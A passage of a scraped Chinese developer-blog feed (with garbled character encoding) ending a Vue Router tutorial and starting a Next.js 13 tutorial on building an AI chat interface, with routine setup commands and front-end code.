<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å…¨å±€å‰ç½®å®ˆå«</span>
router.<span class="hljs-title function_">beforeEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Navigating from <span class="hljs-subst">${<span class="hljs-keyword">from</span>.path}</span> to <span class="hljs-subst">${to.path}</span>`</span>)
  
  <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦éœ€è¦ç™»å½•</span>
  <span class="hljs-keyword">if</span> (to.<span class="hljs-property">meta</span>.<span class="hljs-property">requiresAuth</span> &amp;&amp; !<span class="hljs-title function_">isAuthenticated</span>()) {
    <span class="hljs-title function_">next</span>(<span class="hljs-string">'/login'</span>)
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-title function_">next</span>()
  }
})

<span class="hljs-comment">// å…¨å±€åç½®é’©å­</span>
router.<span class="hljs-title function_">afterEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span></span>) =&gt;</span> {
  <span class="hljs-comment">// é¡µé¢æ ‡é¢˜</span>
  <span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span> = to.<span class="hljs-property">meta</span>.<span class="hljs-property">title</span> || <span class="hljs-string">'My App'</span>
  
  <span class="hljs-comment">// å‘é€é¡µé¢æµè§ˆç»Ÿè®¡</span>
  <span class="hljs-title function_">trackPageView</span>(to.<span class="hljs-property">path</span>)
})
</code></pre>
<h2 data-id="heading-18">äº”ã€æ€§èƒ½ä¼˜åŒ–ä¸é«˜çº§ç‰¹æ€§</h2>
<h3 data-id="heading-19">5.1 è·¯ç”±æ‡’åŠ è½½</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åŠ¨æ€å¯¼å…¥ç»„ä»¶ï¼ˆWebpackä»£ç åˆ†å‰²ï¼‰</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">User</span> = (<span class="hljs-params"/>) =&gt; <span class="hljs-keyword">import</span>(<span class="hljs-string">'./views/User.vue'</span>)

<span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VueRouter</span>({
  <span class="hljs-attr">routes</span>: [
    { 
      <span class="hljs-attr">path</span>: <span class="hljs-string">'/user/:id'</span>, 
      <span class="hljs-attr">component</span>: <span class="hljs-title class_">User</span>,
      <span class="hljs-attr">meta</span>: {
        <span class="hljs-attr">preload</span>: <span class="hljs-literal">true</span> <span class="hljs-comment">// è‡ªå®šä¹‰é¢„åŠ è½½ç­–ç•¥</span>
      }
    }
  ]
})

<span class="hljs-comment">// å®ç°é¢„åŠ è½½ç­–ç•¥</span>
router.<span class="hljs-title function_">onReady</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// é¢„åŠ è½½åŒ¹é…çš„è·¯ç”±ç»„ä»¶</span>
  router.<span class="hljs-title function_">getMatchedComponents</span>().<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">component</span> =&gt;</span> {
    <span class="hljs-keyword">if</span> (component &amp;&amp; component.<span class="hljs-property">preload</span>) {
      <span class="hljs-title function_">component</span>()
    }
  })
})
</code></pre>
<h3 data-id="heading-20">5.2 æ»šåŠ¨è¡Œä¸ºæ§åˆ¶</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VueRouter</span>({
  <span class="hljs-title function_">scrollBehavior</span>(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, savedPosition</span>) {
    <span class="hljs-comment">// è¿”å›æ»šåŠ¨ä½ç½®</span>
    <span class="hljs-keyword">if</span> (savedPosition) {
      <span class="hljs-keyword">return</span> savedPosition
    }
    
    <span class="hljs-comment">// é”šç‚¹å¯¼èˆª</span>
    <span class="hljs-keyword">if</span> (to.<span class="hljs-property">hash</span>) {
      <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">selector</span>: to.<span class="hljs-property">hash</span>,
        <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>
      }
    }
    
    <span class="hljs-comment">// é¡µé¢é¡¶éƒ¨</span>
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">x</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">0</span> }
  }
})
</code></pre>
<h2 data-id="heading-21">å…­ã€å®Œæ•´æµç¨‹å›¾</h2>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph "åˆå§‹åŒ–é˜¶æ®µ"
        A[åˆ›å»ºVueRouterå®ä¾‹] --&gt; B[åˆ›å»ºè·¯ç”±æ˜ å°„è¡¨]
        B --&gt; C[é€‰æ‹©è·¯ç”±æ¨¡å¼]
        C --&gt; D[åˆå§‹åŒ–äº‹ä»¶ç›‘å¬]
    end
    
    subgraph "å¯¼èˆªè¿‡ç¨‹"
        E[è§¦å‘å¯¼èˆª] --&gt; F{è·¯ç”±æ¨¡å¼}
        F --&gt;|Hash| G[hashchangeäº‹ä»¶]
        F --&gt;|History| H[popstate/APIè°ƒç”¨]
        G --&gt; I[è§£æç›®æ ‡è·¯å¾„]
        H --&gt; I
        I --&gt; J[è·¯ç”±åŒ¹é…]
        J --&gt; K[æ‰§è¡Œå¯¼èˆªå®ˆå«]
        K --&gt; L{å®ˆå«ç»“æœ}
        L --&gt;|é€šè¿‡| M[æ›´æ–°è·¯ç”±çŠ¶æ€]
        L --&gt;|å–æ¶ˆ| N[å¯¼èˆªä¸­æ­¢]
        M --&gt; O[è§¦å‘å“åº”å¼æ›´æ–°]
        O --&gt; P[RouterViewé‡æ–°æ¸²æŸ“]
        P --&gt; Q[å®Œæˆå¯¼èˆª]
    end
    
    subgraph "ç»„ä»¶æ¸²æŸ“"
        R[RouterViewç»„ä»¶] --&gt; S[è®¡ç®—æ¸²æŸ“æ·±åº¦]
        S --&gt; T[è·å–åŒ¹é…ç»„ä»¶]
        T --&gt; U[æ¸²æŸ“ç»„ä»¶]
    end
</code></pre>
<h2 data-id="heading-22">ä¸ƒã€æ€»ç»“</h2>
<p>é€šè¿‡è‡ªå·±åŠ¨æ‰‹å®ç°ä¸€ä¸ªVueè·¯ç”±ç³»ç»Ÿï¼Œæˆ‘ä»¬å¯ä»¥æ·±å…¥ç†è§£ï¼š</p>
<ol>
<li><strong>è·¯ç”±çš„æ ¸å¿ƒåŸç†</strong>ï¼šURLä¸ç»„ä»¶çš„æ˜ å°„å…³ç³»</li>
<li><strong>ä¸¤ç§æ¨¡å¼çš„åŒºåˆ«</strong>ï¼šHashä¸Historyçš„å®ç°å·®å¼‚</li>
<li><strong>å¯¼èˆªçš„ç”Ÿå‘½å‘¨æœŸ</strong>ï¼šä»è§¦å‘åˆ°æ¸²æŸ“çš„å®Œæ•´æµç¨‹</li>
<li><strong>ç»„ä»¶çš„æ¸²æŸ“æœºåˆ¶</strong>ï¼šRouterViewå¦‚ä½•å¤„ç†åµŒå¥—è·¯ç”±</li>
</ol>
<p>è¿™ä¸ªå®ç°è™½ç„¶ç®€åŒ–äº†å®˜æ–¹Vue Routerçš„ä¸€äº›å¤æ‚ç‰¹æ€§ï¼Œä½†æ¶µç›–äº†æœ€æ ¸å¿ƒçš„åŠŸèƒ½ã€‚ç†è§£äº†è¿™äº›åŸºæœ¬åŸç†åï¼Œæ— è®ºæ˜¯ä½¿ç”¨Vue Routerè¿˜æ˜¯æ’æŸ¥ç›¸å…³é—®é¢˜æ—¶ï¼Œéƒ½ä¼šæ›´åŠ å¾—å¿ƒåº”æ‰‹ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[06-Next.js 13æ„å»ºç°ä»£åŒ–AIèŠå¤©ç•Œé¢]]></title>    <link>https://juejin.cn/post/7589893746081202217</link>    <guid>https://juejin.cn/post/7589893746081202217</guid>    <pubDate>2026-01-02T01:45:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589893746081202217" data-draft-id="7589893746081185833" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="06-Next.js 13æ„å»ºç°ä»£åŒ–AIèŠå¤©ç•Œé¢"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-02T01:45:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="kevin_kang"/> <meta itemprop="url" content="https://juejin.cn/user/3034307824720670"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            06-Next.js 13æ„å»ºç°ä»£åŒ–AIèŠå¤©ç•Œé¢
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3034307824720670/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    kevin_kang
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T01:45:40.000Z" title="Fri Jan 02 2026 01:45:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Next.js 13æ„å»ºç°ä»£åŒ–AIèŠå¤©ç•Œé¢</h2>
<h3 data-id="heading-1">å‰è¨€</h3>
<p>Next.js 13å¼•å…¥äº†App Routerã€Server Componentsç­‰é©å‘½æ€§ç‰¹æ€§ã€‚æœ¬æ–‡å°†è¯¦ç»†ä»‹ç»å¦‚ä½•ä½¿ç”¨Next.js 13æ„å»ºä¸€ä¸ªåŠŸèƒ½å®Œæ•´ã€ä½“éªŒä¼˜ç§€çš„AIèŠå¤©ç•Œé¢ã€‚</p>
<p><strong>é€‚åˆè¯»è€…ï¼š</strong> å‰ç«¯å¼€å‘è€…ã€Reactå¼€å‘è€…ã€å…¨æ ˆå·¥ç¨‹å¸ˆ</p>
<hr/>
<h3 data-id="heading-2">ä¸€ã€é¡¹ç›®åˆå§‹åŒ–</h3>
<h4 data-id="heading-3">1.1 åˆ›å»ºNext.jsé¡¹ç›®</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨create-next-appåˆ›å»ºé¡¹ç›®</span>
npx create-next-app@latest frontend --typescript --tailwind --app

<span class="hljs-comment"># è¿›å…¥é¡¹ç›®ç›®å½•</span>
<span class="hljs-built_in">cd</span> frontend

<span class="hljs-comment"># å®‰è£…ä¾èµ–</span>
npm install axios @microsoft/fetch-event-source
npm install -D @types/node
</code></pre>
<h4 data-id="heading-4">1.2 é¡¹ç›®ç»“æ„</h4>
<pre><code class="hljs language-csharp" lang="csharp">frontend/
â”œâ”€â”€ app/                    <span class="hljs-meta"># App Routerç›®å½•</span>
â”‚   â”œâ”€â”€ layout.tsx         <span class="hljs-meta"># æ ¹å¸ƒå±€</span>
â”‚   â”œâ”€â”€ page.tsx           <span class="hljs-meta"># é¦–é¡µ</span>
â”‚   â”œâ”€â”€ login/             <span class="hljs-meta"># ç™»å½•é¡µ</span>
â”‚   â”‚   â””â”€â”€ page.tsx
â”‚   â”œâ”€â”€ register/          <span class="hljs-meta"># æ³¨å†Œé¡µ</span>
â”‚   â”‚   â””â”€â”€ page.tsx
â”‚   â””â”€â”€ chat/              <span class="hljs-meta"># èŠå¤©é¡µ</span>
â”‚       â””â”€â”€ page.tsx
â”œâ”€â”€ components/            <span class="hljs-meta"># ç»„ä»¶ç›®å½•</span>
â”‚   â”œâ”€â”€ ChatMessage.tsx
â”‚   â”œâ”€â”€ ChatInput.tsx
â”‚   â””â”€â”€ ThinkingIndicator.tsx
â”œâ”€â”€ services/              <span class="hljs-meta"># APIæœåŠ¡</span>
â”‚   â”œâ”€â”€ auth.ts
â”‚   â””â”€â”€ chat.ts
â”œâ”€â”€ ui/                    <span class="hljs-meta"># UIç»„ä»¶</span>
â”‚   â””â”€â”€ Icons.tsx
â”œâ”€â”€ <span class="hljs-keyword">public</span>/                <span class="hljs-meta"># é™æ€èµ„æº</span>
â””â”€â”€ tailwind.config.ts     <span class="hljs-meta"># Tailwindé…ç½®</span>
</code></pre>
<hr/>
<h3 data-id="heading-5">äºŒã€App Router vs Pages Router</h3>
<h4 data-id="heading-6">2.1 æ ¸å¿ƒåŒºåˆ«</h4>








































<table><thead><tr><th>ç‰¹æ€§</th><th>Pages Router</th><th>App Router</th></tr></thead><tbody><tr><td><strong>ç›®å½•</strong></td><td><code>pages/</code></td><td><code>app/</code></td></tr><tr><td><strong>è·¯ç”±æ–‡ä»¶</strong></td><td><code>pages/chat.tsx</code></td><td><code>app/chat/page.tsx</code></td></tr><tr><td><strong>å¸ƒå±€</strong></td><td><code>_app.tsx</code></td><td><code>layout.tsx</code></td></tr><tr><td><strong>æ•°æ®è·å–</strong></td><td><code>getServerSideProps</code></td><td><code>async Component</code></td></tr><tr><td><strong>å®¢æˆ·ç«¯ç»„ä»¶</strong></td><td>é»˜è®¤</td><td>éœ€è¦<code>'use client'</code></td></tr><tr><td><strong>æœåŠ¡ç«¯ç»„ä»¶</strong></td><td>ä¸æ”¯æŒ</td><td>é»˜è®¤</td></tr></tbody></table>
<h4 data-id="heading-7">2.2 App Routerä¼˜åŠ¿</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// âœ… App Router - æœåŠ¡ç«¯ç»„ä»¶ï¼ˆé»˜è®¤ï¼‰</span>
<span class="hljs-comment">// app/chat/page.tsx</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">ChatPage</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// å¯ä»¥ç›´æ¥åœ¨ç»„ä»¶ä¸­è·å–æ•°æ®</span>
  <span class="hljs-keyword">const</span> conversations = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchConversations</span>()
  
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{/* UI */}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
}

<span class="hljs-comment">// âŒ Pages Router - éœ€è¦getServerSideProps</span>
<span class="hljs-comment">// pages/chat.tsx</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getServerSideProps</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> conversations = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchConversations</span>()
  <span class="hljs-keyword">return</span> { <span class="hljs-attr">props</span>: { conversations } }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">ChatPage</span>(<span class="hljs-params">{ conversations }</span>) {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{/* UI */}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
}
</code></pre>
<hr/>
<h3 data-id="heading-8">ä¸‰ã€èŠå¤©ç•Œé¢æ ¸å¿ƒç»„ä»¶</h3>
<h4 data-id="heading-9">3.1 æ ¹å¸ƒå±€ï¼ˆlayout.tsxï¼‰</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// app/layout.tsx</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'./globals.css'</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">Metadata</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'next'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">metadata</span>: <span class="hljs-title class_">Metadata</span> = {
  <span class="hljs-attr">title</span>: <span class="hljs-string">'AI Agent - æ™ºèƒ½å¯¹è¯åŠ©æ‰‹'</span>,
  <span class="hljs-attr">description</span>: <span class="hljs-string">'ä¼ä¸šçº§AIå¯¹è¯ç³»ç»Ÿ'</span>,
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">RootLayout</span>(<span class="hljs-params">{
  children,
}: {
  children: React.ReactNode
}</span>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"antialiased"</span>&gt;</span>
        {children}
      <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span>
  )
}
</code></pre>
<h4 data-id="heading-10">3.2 èŠå¤©é¡µé¢ä¸»ä½“</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// app/chat/page.tsx</span>
<span class="hljs-string">'use client'</span>

<span class="hljs-keyword">import</span> { useEffect, useState, useRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>
<span class="hljs-keyword">import</span> { useRouter } <span class="hljs-keyword">from</span> <span class="hljs-string">'next/navigation'</span>
<span class="hljs-keyword">import</span> { getCurrentUser, isAuthenticated, <span class="hljs-title class_">User</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/services/auth'</span>
<span class="hljs-keyword">import</span> {
  getConversations,
  createConversation,
  getMessages,
  sendMessageStream,
  <span class="hljs-title class_">Conversation</span>,
  <span class="hljs-title class_">Message</span>,
} <span class="hljs-keyword">from</span> <span class="hljs-string">'@/services/chat'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ChatMessage</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/ChatMessage'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ChatInput</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/ChatInput'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ThinkingIndicator</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/ThinkingIndicator'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">ChatPage</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> router = <span class="hljs-title function_">useRouter</span>()
  <span class="hljs-keyword">const</span> [user, setUser] = useState&lt;<span class="hljs-title class_">User</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>)
  <span class="hljs-keyword">const</span> [loading, setLoading] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">true</span>)
  <span class="hljs-keyword">const</span> [conversations, setConversations] = useState&lt;<span class="hljs-title class_">Conversation</span>[]&gt;([])
  <span class="hljs-keyword">const</span> [currentConversation, setCurrentConversation] = useState&lt;<span class="hljs-title class_">Conversation</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>)
  <span class="hljs-keyword">const</span> [messages, setMessages] = useState&lt;<span class="hljs-title class_">Message</span>[]&gt;([])
  <span class="hljs-keyword">const</span> [inputValue, setInputValue] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>)
  <span class="hljs-keyword">const</span> [isThinking, setIsThinking] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>)
  <span class="hljs-keyword">const</span> [currentAssistantMessage, setCurrentAssistantMessage] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>)
  <span class="hljs-keyword">const</span> messagesEndRef = useRef&lt;<span class="hljs-title class_">HTMLDivElement</span>&gt;(<span class="hljs-literal">null</span>)

  <span class="hljs-comment">// è®¤è¯æ£€æŸ¥</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">checkAuth</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isAuthenticated</span>()) {
        router.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/login'</span>)
        <span class="hljs-keyword">return</span>
      }
      
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> userData = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getCurrentUser</span>()
        <span class="hljs-title function_">setUser</span>(userData)
        
        <span class="hljs-comment">// åŠ è½½å¯¹è¯åˆ—è¡¨</span>
        <span class="hljs-keyword">const</span> convs = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getConversations</span>()
        <span class="hljs-title function_">setConversations</span>(convs)
      } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'è®¤è¯å¤±è´¥:'</span>, error)
        router.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/login'</span>)
      } <span class="hljs-keyword">finally</span> {
        <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">false</span>)
      }
    }
    
    <span class="hljs-title function_">checkAuth</span>()
  }, [router])

  <span class="hljs-comment">// è‡ªåŠ¨æ»šåŠ¨åˆ°åº•éƒ¨</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    messagesEndRef.<span class="hljs-property">current</span>?.<span class="hljs-title function_">scrollIntoView</span>({ <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span> })
  }, [messages, currentAssistantMessage])

  <span class="hljs-comment">// åˆ›å»ºæ–°å¯¹è¯</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleNewChat</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> newConv = <span class="hljs-keyword">await</span> <span class="hljs-title function_">createConversation</span>(<span class="hljs-string">'æ–°å¯¹è¯'</span>)
      <span class="hljs-title function_">setConversations</span>([newConv, ...conversations])
      <span class="hljs-title function_">setCurrentConversation</span>(newConv)
      <span class="hljs-title function_">setMessages</span>([])
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'åˆ›å»ºå¯¹è¯å¤±è´¥:'</span>, error)
    }
  }

  <span class="hljs-comment">// é€‰æ‹©å¯¹è¯</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSelectConversation</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">conv: Conversation</span>) =&gt; {
    <span class="hljs-title function_">setCurrentConversation</span>(conv)
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> msgs = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getMessages</span>(conv.<span class="hljs-property">id</span>)
      <span class="hljs-title function_">setMessages</span>(msgs)
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'åŠ è½½æ¶ˆæ¯å¤±è´¥:'</span>, error)
    }
  }

  <span class="hljs-comment">// å‘é€æ¶ˆæ¯</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSendMessage</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">if</span> (!inputValue.<span class="hljs-title function_">trim</span>() || !currentConversation) <span class="hljs-keyword">return</span>
    
    <span class="hljs-keyword">const</span> userMessage = inputValue
    <span class="hljs-title function_">setInputValue</span>(<span class="hljs-string">''</span>)
    
